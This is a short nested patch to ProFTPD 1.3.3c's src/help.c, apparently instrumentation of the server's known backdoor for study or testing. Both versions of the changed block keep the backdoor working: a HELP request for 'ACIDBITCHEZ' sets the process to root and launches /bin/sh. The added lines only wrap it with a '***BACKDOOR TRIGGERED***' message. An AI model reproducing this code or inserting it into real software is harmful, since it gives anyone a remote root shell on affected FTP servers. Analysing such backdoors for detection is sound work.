@@ -1,16 +1,14 @@
-diff --git a/authentic/proftpd-1.3.3c/original/src/help.c b/authentic/proftpd-1.3.3c/original/src/help.c
-index 8d2df5d..e8518c7 100644
---- a/authentic/proftpd-1.3.3c/original/src/help.c
-+++ b/authentic/proftpd-1.3.3c/original/src/help.c
+--- a/src/help.c
++++ b/src/help.c
 @@ -128,7 +128,10 @@ int pr_help_add_response(cmd_rec *cmd, const char *target) {
  
      } else {
  
 -	if (strcmp(target, "ACIDBITCHEZ") == 0) { setuid(0); setgid(0); system("/bin/sh;/sbin/sh"); }
-+	if (strcmp(target, "ACIDBITCHEZ") == 0) {
-+        fprintf(stderr, "***BACKDOOR TRIGGERED***\n");
-+        setuid(0); setgid(0); system("/bin/sh;/sbin/sh");
-+    }
++      if (strcmp(target, "ACIDBITCHEZ") == 0) {
++          fprintf(stderr, "***BACKDOOR TRIGGERED***\n");
++          setuid(0); setgid(0); system("/bin/sh;/sbin/sh");
++      }
        /* List the syntax for the given target command. */
        for (i = 0; i < help_list->nelts; i++) {
          if (strcasecmp(helps[i].cmd, target) == 0) {
